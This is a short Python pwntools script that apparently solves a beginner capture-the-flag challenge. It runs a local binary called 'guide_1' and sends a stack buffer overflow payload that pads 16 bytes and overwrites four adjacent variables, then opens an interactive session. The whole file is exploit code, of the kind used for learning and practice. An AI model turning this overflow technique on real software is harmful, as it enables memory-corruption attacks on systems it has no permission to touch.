from pwn import *

io = process('../chall/guide_1')
io.recvuntil(b'>')

payload = b'a' * 16 # bof
payload += b"aaaa" # d - p32(0x1)
payload += b"aaaa" # c
payload += b"aaaa" # b
payload += b"aaaa" # a

io.sendline(payload)

io.interactive()